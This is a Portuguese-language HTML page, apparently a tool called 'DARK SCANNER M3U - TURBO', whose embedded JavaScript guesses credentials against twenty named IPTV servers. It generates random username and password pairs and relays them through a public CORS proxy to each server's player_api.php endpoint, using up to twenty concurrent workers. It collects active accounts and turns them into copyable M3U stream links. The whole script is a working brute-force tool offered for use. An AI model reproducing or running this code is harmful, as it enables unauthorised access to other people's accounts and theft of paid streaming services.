<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK SCANNER M3U - TURBO</title>
    <style>
        :root {
            --bg-color: #0a0a12;
            --bg-gradient: linear-gradient(135deg, #0a0a12 40%, #1a1a27 100%);
            --text-color: #e0e0ff;
            --accent-color: #63e6be;
            --accent-color-light: #a2fff0;
            --error-color: #ff5555;
            --success-color: #49d49d;
            --shadow-color: rgba(0, 200, 255, 0.6);
            --progress-bg: #222;
            --progress-fill: #00ffaa;
            --btn-bg: #12131f;
            --btn-hover-bg: #184846;
            --input-bg: #12131f;
            --input-border: #484848;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            margin: 0; 
            padding: 20px;
            background: var(--bg-gradient);
            color: var(--text-color);
            font-family: var(--font-family);
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }
        
        .container {
            width: 100%;
            max-width: 900px;
            background: rgba(10,10,18,0.85);
            box-shadow: 0 0 20px var(--shadow-color);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            z-index: 1;
        }
        
        header {
            text-align: center;
            margin-bottom: 25px;
        }
        
        h1 {
            font-size: 2.2rem;
            color: var(--accent-color);
            text-shadow: 0 0 10px var(--accent-color-light);
            margin-bottom: 10px;
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
                opacity: 1;
                text-shadow: 0 0 7px var(--accent-color),
                            0 0 20px var(--accent-color-light),
                            0 0 30px var(--accent-color-light);
            }
            20%, 22%, 24%, 55% {
                opacity: 0.7;
                text-shadow: none;
            }
        }
        
        .description {
            color: var(--accent-color-light);
            margin-bottom: 20px;
            text-align: center;
        }
        
        .config-panel {
            background: rgba(18, 19, 31, 0.7);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--accent-color-light);
            font-weight: 600;
        }
        
        input[type="number"] {
            width: 100%;
            padding: 12px;
            background: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 6px;
            color: var(--text-color);
            font-size: 1rem;
        }
        
        .btn {
            background-color: var(--btn-bg);
            color: var(--accent-color);
            border: none;
            border-radius: 6px;
            padding: 12px 20px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin: 5px;
        }
        
        .btn:hover {
            background-color: var(--btn-hover-bg);
            box-shadow: 0 0 12px var(--accent-color);
        }
        
        .btn-primary {
            background-color: #1a3a3b;
            color: var(--accent-color);
            width: 100%;
            padding: 15px;
            font-size: 1.1rem;
            margin-top: 15px;
        }
        
        .btn-primary:hover {
            background-color: #225b5c;
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .progress-container {
            background-color: var(--progress-bg);
            border-radius: 12px;
            overflow: hidden;
            height: 25px;
            margin: 20px 0;
            position: relative;
        }
        
        .progress-bar {
            background: var(--progress-fill);
            height: 100%;
            width: 0%;
            transition: width 0.4s ease;
        }
        
        .progress-text {
            position: absolute;
            right: 10px;
            top: 3px;
            font-weight: 700;
            color: var(--text-color);
            text-shadow: 0 0 4px #000c;
        }
        
        .stats {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            justify-content: center;
        }
        
        .stat-item {
            background: #112;
            padding: 10px 15px;
            border-radius: 8px;
            min-width: 120px;
            text-align: center;
            color: var(--accent-color-light);
            font-weight: 600;
        }
        
        .stat-item.hit {
            color: var(--success-color);
            box-shadow: 0 0 12px var(--success-color);
        }
        
        .stat-item.error {
            color: var(--error-color);
            box-shadow: 0 0 14px var(--error-color);
        }
        
        .results-area {
            margin-top: 20px;
        }
        
        .m3u-results {
            width: 100%;
            min-height: 200px;
            background: #121522;
            color: #a0f0ff;
            border-radius: 8px;
            padding: 15px;
            font-family: monospace;
            font-size: 0.9rem;
            margin-top: 15px;
            resize: vertical;
            border: 1px solid var(--input-border);
        }
        
        .m3u-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
            padding: 10px;
            background: #002633;
            border-radius: 6px;
        }
        
        .m3u-link {
            flex: 1;
            word-break: break-all;
            padding-right: 15px;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--accent-color);
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 0 20px var(--accent-color-light);
            color: #021212;
            font-weight: 700;
            opacity: 0;
            transition: opacity 0.5s ease;
            z-index: 1000;
        }
        
        .notification.show {
            opacity: 1;
        }
        
        .ads-container {
            width: 100%;
            margin: 20px 0;
            text-align: center;
            min-height: 90px;
            background: rgba(18, 19, 31, 0.7);
            border-radius: 8px;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        .ad-label {
            color: var(--accent-color-light);
            margin-bottom: 10px;
            font-size: 0.9rem;
        }
        
        footer {
            margin-top: 30px;
            text-align: center;
            color: var(--accent-color-light);
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            h1 {
                font-size: 1.8rem;
            }
            
            .stats {
                flex-direction: column;
            }
            
            .stat-item {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>DARK SCANNER M3U - TURBO</h1>
            <p class="description">Gerador de links M3U+ para IPTV</p>
        </header>
        
        <div class="ads-container">
            <div class="ad-label">Publicidade</div>
            <!-- Espaço para AdSense -->
            <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-seu-codigo-aqui" crossorigin="anonymous"></script>
            <!-- Exemplo de anúncio -->
            <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-seu-codigo-aqui" data-ad-slot="seu-slot-aqui" data-ad-format="auto" data-full-width-responsive="true"></ins>
            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
        </div>
        
        <div class="config-panel">
            <div class="form-group">
                <label for="threadCount">Bots concorrentes (1-20)</label>
                <input type="number" id="threadCount" min="1" max="20" value="5">
            </div>
            
            <button id="generateBtn" class="btn btn-primary">Gerar M3U</button>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
            <div class="progress-text" id="progressText">0%</div>
        </div>
        
        <div class="stats">
            <div class="stat-item" id="totalTested">Testados: 0</div>
            <div class="stat-item hit" id="totalHits">Hits: 0</div>
            <div class="stat-item error" id="totalErrors">Erros: 0</div>
            <div class="stat-item" id="reqPerSec">Req/s: 0</div>
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <button id="stopBtn" class="btn" disabled>Parar</button>
            <button id="copyAllBtn" class="btn" disabled>Copiar Tudo</button>
        </div>
        
        <div class="results-area">
            <h3>Links M3U Encontrados:</h3>
            <div id="m3uResultsContainer">
                <p style="text-align: center; color: var(--accent-color-light); padding: 20px;">
                    Os links M3U aparecerão aqui após a varredura.
                </p>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification"></div>
    
    <footer>
        FEITO POR DARK MENSAGEIRO
    </footer>

    <script>
        // Elementos da UI
        const generateBtn = document.getElementById('generateBtn');
        const stopBtn = document.getElementById('stopBtn');
        const copyAllBtn = document.getElementById('copyAllBtn');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const m3uResultsContainer = document.getElementById('m3uResultsContainer');
        const notification = document.getElementById('notification');
        const stats = {
            totalTested: document.getElementById('totalTested'),
            totalHits: document.getElementById('totalHits'),
            totalErrors: document.getElementById('totalErrors'),
            reqPerSec: document.getElementById('reqPerSec')
        };
        
        // Estado da aplicação
        let isScanning = false;
        let stopRequested = false;
        let totalProcessed = 0;
        let totalHits = 0;
        let totalErrors = 0;
        let startTime = 0;
        let results = [];
        
        // Lista de servidores para teste (mais diversificada)
        const servers = [
            "http://cdn.jccob.click",
            "http://dns.carnes.ink:80",
            "http://dns.cebola.pro:80",
            "http://belize-transport33.sbs:80",
            "http://bpbe.one:80",
            "http://cinefull.space:80",
            "http://cinepulse.live",
            "http://firetop1.site",
            "http://kstv.us:8080",
            "http://limed.cc",
            "http://newbox.space:80",
            "http://nitrohd.xyz:80",
            "http://pfsv.io:80",
            "http://pgzva.my",
            "http://prvdbrack.xyz:80",
            "http://relogio10.top",
            "http://vtrev.cc",
            "http://xci.nz:80",
            "http://brothersplay.com:80",
            "http://cdn.apkwuv.xyz:80"
        ];
        
        // Função para gerar combos aleatórios
        function generateRandomCombos(count) {
            const combos = [];
            for (let i = 0; i < count; i++) {
                // Gera combos aleatórios para garantir resultados diferentes
                const randomNum = Math.floor(Math.random() * 1000000) + 100000;
                const username = `user${randomNum}`;
                const password = `pass${Math.floor(Math.random() * 1000000)}`;
                combos.push(`${username}:${password}`);
            }
            return combos;
        }
        
        // Função para mostrar notificação
        function showNotification(message, duration = 3000) {
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, duration);
        }
        
        // Função para atualizar estatísticas
        function updateStats() {
            stats.totalTested.textContent = `Testados: ${totalProcessed}`;
            stats.totalHits.textContent = `Hits: ${totalHits}`;
            stats.totalErrors.textContent = `Erros: ${totalErrors}`;
            
            const elapsed = (Date.now() - startTime) / 1000;
            if (elapsed > 0) {
                const reqPerSec = (totalProcessed / elapsed).toFixed(1);
                stats.reqPerSec.textContent = `Req/s: ${reqPerSec}`;
            }
            
            const progress = Math.min(100, (totalHits / 10) * 100);
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `${progress.toFixed(1)}%`;
        }
        
        // Função para testar um combo em um servidor
        async function testCombo(server, username, password) {
            const url = `${server}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
            
            try {
                // Usando proxy para evitar CORS
                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
                
                const response = await fetch(proxyUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                
                if (data && data.user_info && data.user_info.status === "Active") {
                    const m3uLink = `${server}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`;
                    return {
                        success: true,
                        server,
                        username,
                        password,
                        m3uLink,
                        status: data.user_info.status
                    };
                } else {
                    return { success: false };
                }
            } catch (error) {
                return { 
                    success: false, 
                    error: error.message 
                };
            }
        }
        
        // Função para renderizar resultados M3U
        function renderM3UResults() {
            if (results.length === 0) {
                m3uResultsContainer.innerHTML = '<p style="text-align: center; color: var(--accent-color-light); padding: 20px;">Nenhum link M3U válido encontrado.</p>';
                return;
            }
            
            m3uResultsContainer.innerHTML = '';
            
            results.forEach((result, index) => {
                const item = document.createElement('div');
                item.className = 'm3u-item';
                
                const link = document.createElement('div');
                link.className = 'm3u-link';
                link.innerHTML = `🔗 LINK M3U: ► ${result.m3uLink}`;
                
                const copyBtn = document.createElement('button');
                copyBtn.className = 'btn';
                copyBtn.textContent = 'Copiar';
                copyBtn.onclick = () => {
                    navigator.clipboard.writeText(result.m3uLink)
                        .then(() => {
                            showNotification('Link copiado!');
                        })
                        .catch(err => {
                            console.error('Falha ao copiar: ', err);
                        });
                };
                
                item.appendChild(link);
                item.appendChild(copyBtn);
                m3uResultsContainer.appendChild(item);
            });
        }
        
        // Função principal de varredura
        async function startScan() {
            if (isScanning) return;
            
            // Reiniciar estado
            isScanning = true;
            stopRequested = false;
            totalProcessed = 0;
            totalHits = 0;
            totalErrors = 0;
            results = [];
            startTime = Date.now();
            
            generateBtn.disabled = true;
            stopBtn.disabled = false;
            copyAllBtn.disabled = true;
            
            // Gerar combos aleatórios para garantir resultados únicos
            const combos = generateRandomCombos(500);
            
            // Obter número de threads
            const threadCount = parseInt(document.getElementById('threadCount').value) || 5;
            
            // Iniciar workers
            const workers = [];
            for (let i = 0; i < threadCount; i++) {
                workers.push(scanWorker(combos));
            }
            
            // Aguardar todos os workers terminarem
            await Promise.all(workers);
            
            // Finalização
            isScanning = false;
            generateBtn.disabled = false;
            stopBtn.disabled = true;
            copyAllBtn.disabled = results.length === 0;
            
            showNotification(`Varredura concluída! ${totalHits} hits encontrados.`);
            
            // Renderizar resultados
            renderM3UResults();
        }
        
        // Worker de varredura
        async function scanWorker(combos) {
            const usedServers = new Set();
            
            while (!stopRequested && combos.length > 0 && totalHits < 10) {
                const combo = combos.pop();
                if (!combo) break;
                
                const [username, password] = combo.split(':');
                if (!username || !password) {
                    totalErrors++;
                    totalProcessed++;
                    updateStats();
                    continue;
                }
                
                // Escolher servidor aleatório que ainda não foi usado para este usuário
                let availableServers = servers.filter(server => !usedServers.has(server));
                if (availableServers.length === 0) {
                    // Se todos os servidores foram usados, reinicie o conjunto
                    usedServers.clear();
                    availableServers = [...servers];
                }
                
                const server = availableServers[Math.floor(Math.random() * availableServers.length)];
                usedServers.add(server);
                
                try {
                    const result = await testCombo(server, username, password);
                    
                    if (result.success) {
                        totalHits++;
                        results.push(result);
                        
                        // Renderizar resultados a cada novo hit
                        renderM3UResults();
                        
                        // Parar se atingirmos 10 hits
                        if (totalHits >= 10) {
                            break;
                        }
                    }
                } catch (error) {
                    totalErrors++;
                }
                
                totalProcessed++;
                updateStats();
                
                // Delay entre requisições para não sobrecarregar
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }
        
        // Event Listeners
        generateBtn.addEventListener('click', startScan);
        
        stopBtn.addEventListener('click', () => {
            stopRequested = true;
            isScanning = false;
            stopBtn.disabled = true;
            generateBtn.disabled = false;
            showNotification('Varredura interrompida');
        });
        
        copyAllBtn.addEventListener('click', () => {
            if (results.length === 0) return;
            
            const allLinks = results.map(r => r.m3uLink).join('\n');
            
            navigator.clipboard.writeText(allLinks)
                .then(() => {
                    showNotification('Todos os links copiados!');
                })
                .catch(err => {
                    console.error('Falha ao copiar: ', err);
                });
        });
    </script>
</body>
</html>
